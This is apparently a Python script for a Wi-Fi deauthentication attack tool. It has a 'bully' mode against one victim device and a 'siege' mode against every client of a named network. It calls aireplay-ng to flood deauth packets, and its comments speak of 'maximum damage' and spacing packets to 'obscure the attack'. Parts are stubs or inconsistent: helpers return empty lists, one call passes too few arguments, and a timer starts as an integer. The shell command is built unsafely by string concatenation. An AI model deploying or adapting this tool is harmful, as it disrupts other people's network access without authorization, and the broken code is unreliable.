import os
from datetime import datetime
import time
from collections import Iterable



def get_bully_attack_list(d, victim):
    # return a dict with channels as keys, for each channel there should be pairs of ap and client
    # where all client macs are the same, but all access points are different
    return []

def get_siege_attack_list(d, clients):
    # return a dict with channels as keys, for each channel there should be pairs of ap and client
    return []

def hop_to_channel(c):
    # TODO benchmark how long it takes to hop channels
    pass


def begin_attack(
                 dict1,
                 dict2,
                 mode="bully",
                 victims_mac = None,
                 net_clients = None,
                 ESSID = None,
                 attack_time = 180,
                 wireless_adapter = "wlan0mon"
                ):

    """
    :param dict1: essid dict data
    :param dict2: inverted index
    :param mode:  defaults to bully mode, otherwise indicate "siege"

    :param victims_mac: must be a string with the mac address to be bullied
                        and passed by name if bully mode

    :param ESSID: must be a string with the identifier of a network
    :param net_clients: optional list of clients in ESSID network clients
                        passing an empty list indicates attack all

    :param attack_time: attack length duration in seconds, defaults to 180
    :return:            1/0
    """
    attack_list = []
    channels = []

    if mode == "bully":
        assert net_clients  is None
        assert ESSID is None
        assert not dict2 is None
        attack_list = get_bully_attack_list(dict2)
        channels = [int (k) for k in dict2[victims_mac]["channels"]]

    else:
        assert victims_mac is None
        assert not dict1 is None
        attack_list = get_siege_attack_list(dict1, net_clients)
        channels = [int(k) for k in dict1[ESSID]]

    CURR_TIME = datetime.now()
    TIME_DIFF = 0
    channel_idx = 0

    while TIME_DIFF.total_seconds() < attack_time:
        #cycle through channels array
        channel_idx = channel_idx + 1 if channel_idx + 1 < len(channels) else 0
        hop_to_channel(channels[channel_idx])
        # TODO Tinker with list_cycles to achieve maximum damage
        attack_clients(attack_list[channel_idx], 1, wireless_adapter, list_cycles=2, time_between_cycles=0 )
        TIME_DIFF = datetime.now() - CURR_TIME

    return 0





def de_auth_client( client_mac,
                    access_point_mac,
                    deauths=1,
                    adapter="wlan0mon"):

    """
    :param client_mac:
    :param access_point_mac:
    :param deauths: number of de-authentications (128 packets to router and client per deauth)
    :param adapter:
    :return:
    """
    r = os.system("aireplay-ng " + "-0 " + str(deauths) + " -a " + str(access_point_mac) \
              + " -c " + client_mac + " " + adapter)

    """
    # slow but better feedback
    import subprocess
    r2 = subprocess.call(["aireplay-ng", "-0", str(num_packets), "-a", str(access_point_mac),\
                          "-c", client_mac, adapter], stdout=subprocess.PIPE)

    stdout, stderr = r2.communicate()
    """
    return r

def attack_clients(clients_dict,
                   de_auths_per_client,
                   adapter,
                   timeout=60,
                   list_cycles=100,
                   time_between_cycles=1
                   ):
    """
    :param clients_dict: a dictionary of clients with (at least) client_mac, ap_mac. keys
    :param de_auths_per_client: (int) doesn't necessarily have to be large if
           cycling a list of clients is fast enough. Also note that 1 deauth = 128 packets
           Passing this option as zero makes it unlimited deauths
    :param adapter: If not wlan0mon pass name here
    :param timeout: how long is the attack
    :param list_cycles: how many iterations over the list of victims
    :param time_between_cycles: (int/float  in seconds) can help obscure the attack
    :return:  nothing

        IMPORTANT. List of clients exist on a per-channel basis. So this function needs to be
        called for every channel where there are targets.
    """
    CURR_TIME = datetime.now()
    TIME_DIFF = datetime.now() - CURR_TIME

    count = 0
    for i in range (list_cycles):

        TIME_DIFF = datetime.now() - CURR_TIME
        if timeout < TIME_DIFF.total_seconds() :
            print ("terminating timed attack")
            break
        else:
            for client in clients_dict:
                count += 1
                de_auth_client(client["client_mac"],
                               client["ap_mac"],
                               deauths=de_auths_per_client,
                               adapter=adapter)
                if time_between_cycles > 0:
                    print ("sleeping for: " + str(time_between_cycles))
                    time.sleep(time_between_cycles)

    print ("terminating list cycle attack")

if __name__ == "__main__":
    pass
